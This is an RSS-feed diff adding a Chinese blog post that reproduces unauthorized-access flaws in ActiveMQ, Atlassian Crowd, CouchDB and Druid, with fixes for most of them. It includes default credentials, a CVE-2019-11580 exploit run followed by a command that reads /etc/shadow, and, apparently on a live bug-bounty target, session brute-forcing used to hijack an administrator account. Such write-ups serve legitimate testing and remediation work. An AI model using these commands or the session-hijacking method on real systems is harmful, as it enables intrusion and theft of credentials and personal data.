@@ -5,11 +5,91 @@
         <link>http://example.com</link>
         <description></description>
         <language>zh-CN</language>
-        <pubDate>Tue, 05 Nov 2024 16:02:29 +0800</pubDate>
-        <lastBuildDate>Tue, 05 Nov 2024 16:02:29 +0800</lastBuildDate>
+        <pubDate>Mon, 11 Nov 2024 09:00:02 +0800</pubDate>
+        <lastBuildDate>Mon, 11 Nov 2024 09:00:02 +0800</lastBuildDate>
         <category>漏洞复现</category>
         <category>神兵利器</category>
         <category>应急响应</category>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/11/11/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/</guid>
+            <title>未授权访问漏洞合集</title>
+            <link>http://example.com/2024/11/11/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/</link>
+            <category>漏洞复现</category>
+            <pubDate>Mon, 11 Nov 2024 09:00:02 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;未授权访问漏洞合集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#未授权访问漏洞合集&#34;&gt;#&lt;/a&gt; 未授权访问漏洞合集&lt;/h1&gt;
+&lt;h2 id=&#34;介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#介绍&#34;&gt;#&lt;/a&gt; 介绍&lt;/h2&gt;
+&lt;p&gt;未授权访问漏洞是一个在企业内部非常常见的问题，这种问题通常都是由于安全配置不当、认证页面存在缺陷，或者压根就没有认证导致的。当某企业对外的服务端口、功能无限制开放，并且对用户的访问没有做任何限制的时候，可能会泄露出某些用户信息、敏感信息甚至可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111090506.png&#34; alt=&#34;20241111090506&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;active-mq-未授权访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#active-mq-未授权访问&#34;&gt;#&lt;/a&gt; Active MQ 未授权访问&lt;/h2&gt;
+&lt;h3 id=&#34;漏洞简介&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞简介&#34;&gt;#&lt;/a&gt; 漏洞简介&lt;/h3&gt;
+&lt;p&gt;ActiveMQ 是一款流行的开源消息服务器。默认情况下，ActiveMQ 服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。&lt;/p&gt;
+&lt;h3 id=&#34;漏洞检测&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞检测&#34;&gt;#&lt;/a&gt; 漏洞检测&lt;/h3&gt;
+&lt;p&gt;默认端口：8161&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111232210.png&#34; alt=&#34;20241111232210&#34;&gt;&lt;br&gt;
+ 默认密码：admin/admin&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111232231.png&#34; alt=&#34;20241111232231&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;漏洞修复&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞修复&#34;&gt;#&lt;/a&gt; 漏洞修复&lt;/h3&gt;
+&lt;p&gt;● 针对未授权访问，可修改 conf/jetty.xml 文件，bean id 为 securityConstraint 下的 authenticate 修改值为 true，重启服务即可。&lt;br&gt;
+● 针对弱口令，可修改 conf/jetty.xml 文件，bean id 为 securityLoginService 下的 conf 值获取用户 properties，修改用户名密码，重启服务即可。&lt;br&gt;
+● 参考文章 &lt;a href=&#34;https://www.ouyangxiaoze.com/2020/08/631.html&#34;&gt;https://www.ouyangxiaoze.com/2020/08/631.html&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;atlassian-crowd-未授权访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#atlassian-crowd-未授权访问&#34;&gt;#&lt;/a&gt; Atlassian Crowd 未授权访问&lt;/h2&gt;
+&lt;h3 id=&#34;漏洞简介-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞简介-2&#34;&gt;#&lt;/a&gt; 漏洞简介&lt;/h3&gt;
+&lt;p&gt;Atlassian Crowd 是一套基于 Web 的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center 是 Crowd 的集群部署版。&lt;br&gt;
+Atlassian Crowd 和 Crowd Data Center 在其某些发行版本中错误地启用了 pdkinstall 开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对 Atlassian Crowd 和 Crowd Data Center 安装任意的恶意插件，执行任意代码 / 命令，从而获得服务器权限。&lt;/p&gt;
+&lt;h3 id=&#34;漏洞检测-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞检测-2&#34;&gt;#&lt;/a&gt; 漏洞检测&lt;/h3&gt;
+&lt;p&gt;漏洞利用脚本 github 地址：&lt;a href=&#34;https://github.com/jas502n/CVE-2019-11580&#34;&gt;https://github.com/jas502n/CVE-2019-11580&lt;/a&gt;&lt;br&gt;
+1 git clone &lt;a href=&#34;https://github.com/jas502n/CVE-2019-11580&#34;&gt;https://github.com/jas502n/CVE-2019-11580&lt;/a&gt;&lt;br&gt;
+2 cd CVE-2019-11580/&lt;br&gt;
+3 python &lt;a href=&#34;http://CVE-2019-11580.py&#34;&gt;CVE-2019-11580.py&lt;/a&gt; &lt;a href=&#34;http://192.168.18.138:8095&#34;&gt;http://192.168.18.138:8095&lt;/a&gt;&lt;br&gt;
+4 curl &lt;a href=&#34;http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow&#34;&gt;http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=cat /etc/shadow&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;漏洞修复-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞修复-2&#34;&gt;#&lt;/a&gt; 漏洞修复&lt;/h3&gt;
+&lt;p&gt;● 设置访问 /crowd/admin/uploadplugin.action 的源 ip。&lt;br&gt;
+● 升级最新版本 (3.5.0 以上)。&lt;/p&gt;
+&lt;h2 id=&#34;couchdb-未授权访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#couchdb-未授权访问&#34;&gt;#&lt;/a&gt; CouchDB 未授权访问&lt;/h2&gt;
+&lt;h3 id=&#34;漏洞介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞介绍&#34;&gt;#&lt;/a&gt; 漏洞介绍&lt;/h3&gt;
+&lt;p&gt;Apache CouchDB 是一个开源数据库，默认会在 5984 端口开放 Restful 的 API 接口，如果使用 SSL 的话就会监听在 6984 端口，用于数据库的管理功能。其 HTTP Server 默认开启时没有进行验证，而且绑定在 0.0.0.0，所有用户均可通过 API 访问导致未授权访问。&lt;br&gt;
+在官方配置文档中对 HTTP Server 的配置有 WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生。&lt;br&gt;
+Apache CouchDB 是⼀个开源数据库，专注于易⽤性和成为 &amp;quot;完全拥抱 web 的数据库&amp;quot; 。它是⼀个使⽤ JSON 作为存储格式，JavaScript 作为查询语⾔，MapReduce 和 HTTP 作为 API 的 NoSQL 数据库。应⽤⼴泛，如 BBC ⽤在其动态内容展示平台，Credit Suisse ⽤在其内部的商品部⻔的市场框架，Meebo，⽤在其社交平台（web 和应⽤程序）。&lt;/p&gt;
+&lt;h3 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h3&gt;
+&lt;p&gt;(port=“5984”) &amp;amp;&amp;amp; (is_honeypot=false &amp;amp;&amp;amp; is_fraud=false)&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111233308.png&#34; alt=&#34;20241111233308&#34;&gt;&lt;br&gt;
+cd /vulhub/couchdb/CVE-2017-12636&lt;br&gt;
+docker-compose up -d&lt;br&gt;
+ 然后利用 curl 执⾏未授权访问测试命令：curl IP:5984/_config&lt;br&gt;
+ 如果目标存在 couchdb 未授权访问漏洞，则会出现如下&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111233330.png&#34; alt=&#34;20241111233330&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;漏洞修复-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞修复-3&#34;&gt;#&lt;/a&gt; 漏洞修复&lt;/h3&gt;
+&lt;p&gt;1. 指定 CouchDB 绑定的 IP （需要重启 CouchDB 才能⽣效）在 /etc/couchdb/local.ini ⽂件中&lt;br&gt;
+找到 “bind_address = 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。 注：修改后只有本机才能访问 CouchDB。&lt;br&gt;
+2. 设置访问密码（需要重启 CouchDB 才能⽣效）在 /etc/couchdb/local.ini 中找到 “[admins]” 字段配置密码。&lt;br&gt;
+3. 设置 WWW-Authenticate，强制认证。&lt;/p&gt;
+&lt;h2 id=&#34;druid-未授权访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#druid-未授权访问&#34;&gt;#&lt;/a&gt; Druid 未授权访问&lt;/h2&gt;
+&lt;h3 id=&#34;漏洞介绍-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞介绍-2&#34;&gt;#&lt;/a&gt; 漏洞介绍&lt;/h3&gt;
+&lt;p&gt;当开发者配置不当时就可能造成未授权访问&lt;/p&gt;
+&lt;h3 id=&#34;漏洞复现-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现-2&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h3&gt;
+&lt;p&gt;在 fofa 中利用如下语句进行搜索&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;title=&amp;quot;Druid Stat Index&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;访问之后直接进入网站页面，则存在 druid 未授权访问漏洞&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111233616.png&#34; alt=&#34;20241111233616&#34;&gt;&lt;br&gt;
+&lt;a href=&#34;http://43.130.0.0:8088/druid/weburi.html&#34;&gt;http://43.130.0.0:8088/druid/weburi.html&lt;/a&gt;&lt;br&gt;
+ 泄露了网站后台功能模块的 url 地址，大多数都是一些 api 接口，有时候也会泄露一些敏感文件&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111233802.png&#34; alt=&#34;20241111233802&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;druid泄露点利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#druid泄露点利用&#34;&gt;#&lt;/a&gt; Druid 泄露点利用&lt;/h3&gt;
+&lt;p&gt;如果是单纯的提交一个未授权访问，可能 SRC 平台也就给个低危，几十块钱，但是如果我们利用泄露的 session 进行 url 爆破，可能就能从低危转向高危，具体操作步骤如下&lt;br&gt;
+ 1. 将所有的 session 组成字典，我这是是直接 copy 下来用 sublime 正则去提取的，随便找了一个普通的接口去爆破，如果 session 没失效的话会提示 200，如果 session 失效会提示 302 跳转登陆页。&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111233923.png&#34; alt=&#34;20241111233923&#34;&gt;&lt;br&gt;
+ 我这里是爆破出来了将近 100 个没有失效的 session，构造请求包也很简单，就抓一个登录的包，把 url 跟 cookie 里面的 session 替换一下就可以。&lt;br&gt;
+利用火狐里面的 cookie 替换工具，将 cookie 替换成我们爆破成功的 cookie，即可登录页面查看，&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/1fa5046754d70eac017c036b47ae34ff.png&#34; alt=&#34;1fa5046754d70eac017c036b47ae34ff&#34;&gt;&lt;br&gt;
+ 利用没失效的 session 成功访问后台界面&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/c963356503bae1319cdb3062dee23c98.png&#34; alt=&#34;c963356503bae1319cdb3062dee23c98&#34;&gt;&lt;br&gt;
+ 这里我碰到了一个小问题，就是访问单页面没有联动，每一个都是静态的页面，只能查看当前页面的东西，对于提交漏洞报告的时候，不是很能表明出漏洞的危害程度。2. 这里我们继续爆破，将泄露的 druid/weburi.html 组成字典，进行爆破。&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/383f9fe80df1acf3db70e8fc9964cf5a.png&#34; alt=&#34;383f9fe80df1acf3db70e8fc9964cf5a&#34;&gt;&lt;br&gt;
+ 在爆破 url 的时候，发现好几处管理员的页面，提示用户权限不足，看了一下是用户管理，这里我们就可以再对当前页面继续进行 session 爆破，我这里运气比较好，成功爆破到了管理员的 session，一般情况来说生产环境的应用系统，管理员一般都是会登录的。&lt;br&gt;
+利用管理员的 session 成功登录到了人员管理界面&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/cb346346692012a13c10a9c66b30791e.png&#34; alt=&#34;cb346346692012a13c10a9c66b30791e&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://example.com/2024/11/05/%E6%99%BA%E6%85%A7%E5%B9%B3%E5%8F%B0SExcelExpErr.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</guid>
             <title>智慧平台SExcelExpErr.ashx存在SQL注入漏洞</title>
